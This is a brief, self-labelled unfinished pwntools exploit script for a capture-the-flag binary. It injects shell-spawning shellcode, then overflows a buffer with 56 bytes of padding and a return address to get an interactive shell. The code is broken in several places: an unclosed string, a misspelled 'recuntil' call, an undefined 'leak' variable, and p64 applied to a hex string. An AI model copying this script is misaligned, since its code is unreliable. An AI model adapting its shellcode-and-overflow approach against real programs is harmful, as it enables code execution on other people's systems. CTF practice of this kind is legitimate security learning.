from pwn import *
binary = context.binary = ELF('./chall_06)
p = process(binary.path)
p.recuntil('I drink milk even though i\'m lactose intolerant: ')
p.sendline(b'' + asm(shellcraft.sh()))
p.sendline(b'' + 56*b'A' + p64(hex(int(leak,16))))
p.interactive()
# NOT FINISHED
